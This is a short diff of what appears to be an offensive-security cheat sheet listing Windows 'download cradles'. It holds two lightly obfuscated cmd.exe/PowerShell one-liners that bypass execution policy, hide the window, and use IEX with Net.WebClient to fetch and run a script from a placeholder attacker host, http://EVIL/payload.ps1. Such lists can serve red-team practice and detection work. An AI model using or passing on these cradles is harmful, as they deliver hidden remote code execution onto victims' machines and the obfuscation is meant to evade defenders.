@@ -1,5 +1,4 @@
 # Not proxy aware download cradles, which can be executed in a Windows Command Shell (cmd.exe)  
-
 # Windows Command Shell download cradles, not proxy aware ligthly obfuscated 
 cmd> c:\WInDowS\sySTEM32\cmD.eXE   /c  PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNDOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"
 cmd> PoWErSheLl  -nopROfi  -EXe  byPAsS  -wiNdOwsTy  HIDdEN -cOMMA  "IEX (New-Object Net.Webclient).downloadstring(\"http://EVIL/payload.ps1\")"
